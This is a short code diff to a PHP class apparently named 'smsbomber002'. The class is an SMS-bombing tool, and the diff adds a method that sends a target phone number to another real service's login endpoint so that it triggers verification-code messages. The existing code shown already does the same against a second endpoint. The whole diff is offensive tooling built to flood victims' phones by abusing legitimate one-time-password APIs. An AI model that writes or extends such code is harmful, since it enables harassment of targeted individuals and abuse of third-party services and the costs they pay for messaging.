@@ -158,6 +158,12 @@ class smsbomber002 extends mbomber002
         return $this->s002("https://www.azki.com/api/vehicleorder/v2/app/auth/login-with-verify-code", ["phoneNumber" => $this->$Number] ,["deviceid: 6"]);
       
     }
+
+    public function SazkiVam()
+    {
+        return $this->s002("https://api.azkivam.com/auth/login", ["mobileNumber" => $this->$Number] );
+      
+    }
   
 }
 
